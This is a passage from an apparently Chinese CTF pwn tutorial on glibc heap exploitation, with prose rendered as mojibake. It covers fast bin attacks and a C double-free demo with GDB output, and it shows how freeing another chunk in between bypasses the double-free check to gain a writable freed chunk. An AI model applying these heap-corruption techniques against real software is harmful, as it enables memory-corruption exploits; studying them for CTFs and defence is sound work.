åï¼Œ<strong>å †çš„å¸ƒå±€å¹¶æœªå‘ç”Ÿå˜åŒ–</strong>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A836.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨36.png"></p><p>ä½†å½“æˆ‘ä»¬å†æ¬¡ä½¿ç”¨ <code>a -&gt; func(&quot;can not be printed...&quot;)</code> çš„æ—¶å€™</p><p>**ç¨‹åºä¼šç›´æ¥æŠ¥å‡ºæ®µé”™è¯¯ï¼Œè€Œä¸æ˜¯ç»§ç»­è°ƒç”¨ <code>0x4005d1</code> åœ°å€å¤„çš„ <code>printmyname()</code>**ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A837.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨37.png"></p><blockquote><p>å‘ç”Ÿæ®µé”™è¯¯çš„å…³é”®åœ¨äºï¼š</p><p>æˆ‘ä»¬å‰é¢æ‰§è¡Œ <code>a = NULL</code> çš„æ—¶å€™å°† RBP - 8 åœ°å€å¤„ç½®ä¸ºäº† 0ï¼Œå› æ­¤æ‰§è¡Œ <code>mov rax, qword ptr [rbp - 8]</code> æ—¶ RAX &#x3D; 0ï¼Œæ­¤æ—¶æ‰§è¡Œ <code>mov rax, qword ptr [rax + 8]</code> è¦æ±‚ä»å†…å­˜åœ°å€ä¸º 8 çš„åœ°æ–¹å–å€¼èµ‹ç»™ RAXï¼Œæ˜¾ç„¶è¿™ä¸ªå†…å­˜åœ°å€æ˜¯é”™è¯¯çš„</p></blockquote><hr><h1 id="Fast-bin-Attack"><a href="#Fast-bin-Attack" class="headerlink" title="Fast bin Attack"></a>Fast bin Attack</h1><blockquote><p>Fast bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>fast bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki</a></p></blockquote><p>Fast bin Attack åˆ©ç”¨çš„å‰æï¼š</p><ul><li>å­˜åœ¨å †æº¢å‡ºã€UAF ç­‰èƒ½æ§åˆ¶ <code>chunk</code> å†…å®¹çš„æ¼æ´  </li><li>æ¼æ´å‘ç”Ÿäº <code>fast bin</code> ç±»å‹çš„ <code>chunk</code> ä¸­</li></ul><p>ç”±äº <code>fast bin</code> ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—ï¼Œå¹¶ä¸”<strong>ç”± <code>fast bin</code> ç®¡ç†çš„ <code>chunk</code> å³ä½¿è¢«é‡Šæ”¾ï¼Œå…¶ <code>next_chunk</code> çš„ <code>prev_inuse</code> ä½ä¹Ÿä¸ä¼šè¢«æ¸…ç©º</strong></p><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">,</span> <span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è¿›è¡Œé‡Šæ”¾</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œä¸‰æ¬¡ <code>free</code> è¿›è¡Œé‡Šæ”¾å</p><p>æ­¤æ—¶ä½äº <code>main_arena</code> ä¸­çš„ <code>fastbin</code> é“¾è¡¨ä¸­å·²ç»å‚¨å­˜äº†æŒ‡å‘ <code>chunk3</code> çš„æŒ‡é’ˆï¼ˆæœ€è¿‘é‡Šæ”¾ï¼‰ï¼Œå¹¶ä¸” <code>chunk3</code>ã€<code>chunk2</code>ã€<code>chunk1</code> æ„æˆäº†ä¸€ä¸ªå•é“¾è¡¨ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A851.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨51.png"></p><hr><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><blockquote><p>Double free æŒ‡åŒä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜è¢« <code>free</code> ä¸¤æ¬¡</p><p>å †ä¸Šçš„æŸå—å†…å­˜è¢«é‡Šæ”¾åï¼Œå¦‚æœæ²¡æœ‰å°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆæ¸…é›¶ï¼Œå°±å¯ä»¥åˆ©ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†å¯¹è¯¥å†…å­˜è¿›è¡Œå†æ¬¡çš„ <code>free</code>ï¼Œ<strong>æœ€ç»ˆå¾—åˆ°ä¸€ä¸ªå¯ç”¨çš„ç©ºé—²å—æŒ‡é’ˆï¼Œå¹¶ä¸”èƒ½å¤Ÿä¿®æ”¹å·²ç»è¢«é‡Šæ”¾çš„ç©ºé—²å—ä¸­çš„å†…å®¹</strong>ï¼Œä»è€Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å®ç°<strong>ä»»æ„åœ°å€å†™</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/241598">å †åˆ©ç”¨ç³»åˆ—ä¹‹å †æ¼æ´-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></blockquote><p>æ€»çš„æ¥è¯´ï¼Œdouble free å°±æ˜¯é€šè¿‡ 2 æ¬¡ <code>free</code>ï¼Œ2 æ¬¡ <code>malloc</code>ï¼Œå† 1 æ¬¡ <code>free</code>ï¼Œæœ€ç»ˆå¾—åˆ°å¯ç”¨çš„ç©ºé—²å—æŒ‡é’ˆï¼Œå¹¶ä¸”å¯ä»¥ä¿®æ”¹ç©ºé—²å—ä¸­çš„å†…å®¹</p><p>è¯¦ç»†æ¥è¯´å°±æ˜¯ï¼š</p><ol><li>é¦–å…ˆä¸¤æ¬¡ <code>free</code> åŒä¸€å—åœ°å€ï¼ˆä¸¤æ¬¡ <code>free</code> ä¹‹é—´éœ€è¦å…ˆ <code>free</code> ä¸€æ¬¡å…¶ä»–çš„ <code>chunk</code> æ¥ç»•è¿‡æ£€æµ‹ï¼‰  </li><li>ç„¶åå†è¿ç»­ä¸¤æ¬¡ <code>malloc</code> ç›¸åŒå¤§å°  </li><li>ç„¶åå† <code>free</code> æ‰å…¶ä¸­ä¸€ä¸ª</li><li>é‚£ä¹ˆå‰©ä¸‹é‚£ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å°±æ˜¯ç©ºé—²å—çš„ <code>chunk</code>ï¼Œè€Œä¸”è¿˜æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„</li></ol><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr0<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">;</span>    ptr0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk1</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk2</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk3</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data0 <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token string">"11111111"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data2 <span class="token operator">=</span> <span class="token string">"22222222"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk1: ptr0 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr0<span class="token punctuation">,</span> ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk2: ptr1 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk3: ptr2 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// double free</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">,</span> <span class="token operator">*</span>ptr5<span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk4</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk5</span>    ptr5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk6</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: ptr4 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr4<span class="token punctuation">,</span> ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data3 <span class="token operator">=</span> <span class="token string">"15935728"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•è§‚å¯Ÿä¸€ä¸‹æ•´ä¸ªæ‰§è¡Œæµç¨‹</p><p>åˆšå¼€å§‹åˆ›å»ºä¸‰ä¸ªå †å— <code>ptr0</code>ã€<code>ptr1</code> å’Œ <code>ptr2</code>ï¼Œå¹¶é€šè¿‡ <code>data0</code>ã€<code>data1</code>ã€<code>data2</code> è¿›è¡Œèµ‹å€¼ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A838.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨38.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk1<span class="token operator">:</span> ptr0 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">00000000</span>Chunk2<span class="token operator">:</span> ptr1 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk3<span class="token operator">:</span> ptr2 @ <span class="token number">0x602090</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆ <code>free</code> æ‰ <code>ptr0</code> å’Œ <code>ptr1</code>ï¼Œå®ƒä»¬éƒ½è¢«ç½®äº <code>fast bin</code> ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A839.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨39.png"></p><p><code>ptr1</code> çš„ <code>fd</code> æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²çš„ <code>chunk</code>ï¼Œå³ï¼š<code>ptr0</code> çš„åœ°å€</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A842.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨42.png"></p><blockquote><p>æ³¨æ„ï¼š</p><p>åœ¨å¯¹ <code>ptr0</code> çš„ double free ä¹‹é—´ï¼Œæˆ‘ä»¬ç©¿æ’äº†ä¸€ä¸ª <code>free(ptr1)</code> çš„æ“ä½œï¼Œè¿™ä¹ˆåšä¸æ˜¯æ¯«æ— æ ¹æ®çš„ï¼Œè€Œæ˜¯ä¸ºäº†ç»•è¿‡æ£€æµ‹</p><p>å› ä¸ºåœ¨ä¸åŒç‰ˆæœ¬çš„ <code>malloc</code> ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¯¹ double free çš„æ£€æµ‹ï¼š<strong>å¦‚æœå½“å‰è¢«é‡Šæ”¾çš„æŒ‡é’ˆä¸æœ€åä¸€ä¸ªé‡Šæ”¾çš„å†…å­˜å—ç›¸åŒï¼Œç¨‹åºå°†åœæ­¢æ‰§è¡Œ</strong></p><p>è€Œ <code>fast bin</code> åœ¨æ‰§è¡Œ <code>free</code> çš„æ—¶å€™ä»…éªŒè¯äº† <code>main_arena</code> ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ï¼Œå¯¹äºé“¾è¡¨åé¢çš„å—ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒéªŒè¯</p><p>å› æ­¤ï¼Œç»•è¿‡è¿™ä¸ªæ£€æµ‹çš„æ–¹æ³•å°±æ˜¯ï¼š<strong>åœ¨ä¸¤æ¬¡é‡Šæ”¾åŒä¸€ä¸ªæŒ‡é’ˆä¹‹é—´é‡Šæ”¾å¦ä¸€ä¸ªæŒ‡é’ˆ</strong>ï¼ˆä½†æ˜¯åœ¨ Glibc 2.27 ä¸­ï¼Œå®ƒå°†å‘½ä¸­ <code>tcache</code>ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼‰</p></blockquote><p>ä¸ºäº†å®ç° double freeï¼Œæˆ‘ä»¬å†æ¬¡ <code>free</code> æ‰ <code>ptr0</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A840.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨40.png"></p><p>æ­¤æ—¶ <code>ptr1</code> çš„ <code>fd</code> æŒ‡é’ˆæŒ‡å‘ <code>ptr0</code> çš„åœ°å€ï¼ŒåŒæ—¶ <code>ptr0</code> çš„ <code>fd</code> æŒ‡é’ˆä¹ŸæŒ‡å‘ <code>ptr1</code> çš„åœ°å€</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A841.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨41.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ†é…ä¸‰ä¸ªæ–°å†…å­˜å—ï¼Œå¤§å°ä¸æˆ‘ä»¬é‡Šæ”¾çš„å†…å­˜å—ç›¸åŒ</p><p>æ‰§è¡Œå®Œ <code>ptr3 = malloc(0x30)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A843.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨43.png"></p><p>æ‰§è¡Œå®Œ <code>ptr4 = malloc(0x30)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A844.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨44.png"></p><p>æ‰§è¡Œå®Œ <code>ptr5 = malloc(0x30)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A845.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨45.png"></p><p>å‘å®ƒä»¬å†™å…¥ <code>data0</code>ã€<code>data1</code>ã€<code>data2</code> çš„æ•°æ®ï¼Œè¿™å°†ä½¿æˆ‘ä»¬å¾—åˆ°ä¹‹å‰é‡Šæ”¾çš„ä¸‰ä¸ªå†…å­˜å—</p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr3, data0, 0x8)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A846.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨46.png"></p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr4, data1, 0x8)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A847.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨47.png"></p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr5, data2, 0x8)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A848.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨48.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå‘ <code>ptr5</code> ä¸­å†™å…¥çš„æ•°æ®å®é™…å†™å…¥åˆ°äº† <code>chunk4</code> ä¸­</p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span>Chunk5<span class="token operator">:</span> ptr4 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>åˆ°è¿™é‡Œå¯ä»¥å‘ç°ï¼Œ<strong>ç”±äºå‰é¢ä¸¤æ¬¡é‡Šæ”¾äº†åŒä¸€ä¸ªæŒ‡é’ˆï¼Œç°åœ¨æˆ‘ä»¬åˆ†é…åˆ°äº†ç›¸åŒçš„æŒ‡é’ˆ</strong>ï¼ˆå› ä¸º <code>malloc</code> ä¼šå‡ºäºæ€§èƒ½æå‡çš„åŸå› é‡ç”¨ç›¸ä¼¼å¤§å°çš„å·²é‡Šæ”¾å†…å­˜å—ï¼‰</p></blockquote><p><em>ç°åœ¨æˆ‘ä»¬å¯ä»¥é‡Šæ”¾æŒ‡å‘ <code>chunk4</code> æˆ– <code>chunk6</code> çš„å…¶ä¸­ä¸€ä¸ªæŒ‡é’ˆï¼ˆå³ï¼š<code>ptr3</code> æˆ– <code>ptr5</code>ï¼‰ï¼Œå¹¶æ¸…é™¤è¯¥æŒ‡é’ˆï¼ˆé˜²æ­¢ä½¿ç”¨é‡Šæ”¾åçš„æŒ‡é’ˆï¼‰ï¼Œè€Œæˆ‘ä»¬ä»ç„¶ä¼šæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå†…å­˜å—ï¼Œè€Œè¯¥å†…å­˜å—ç°åœ¨å·²è¢«é‡Šæ”¾</em></p><p><mark>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ double free æ¥ç¼–è¾‘å·²é‡Šæ”¾çš„å†…å­˜å—</mark></p><p>æ‰§è¡Œ <code>free(ptr3)</code> å¹¶å°† <code>ptr3</code> ç½®ä¸º NULL åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A849.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨49.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€šè¿‡ <code>memcpy(ptr5, data3, 0x8)</code> å‘ <code>ptr5</code> å†™å…¥æ•°æ®æ—¶ï¼Œ<strong>ä¼šå°†æ•°æ®å†™å…¥åˆ°å·²ç»è¢«é‡Šæ”¾çš„ <code>chunk4</code> ä¸­</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A850.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨50.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">15935728</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p>House of Spirit æ˜¯Â the Malloc MaleficarumÂ ä¸­çš„ä¸€ç§æŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒåœ¨äºï¼š<strong>åœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  <code>fast bin 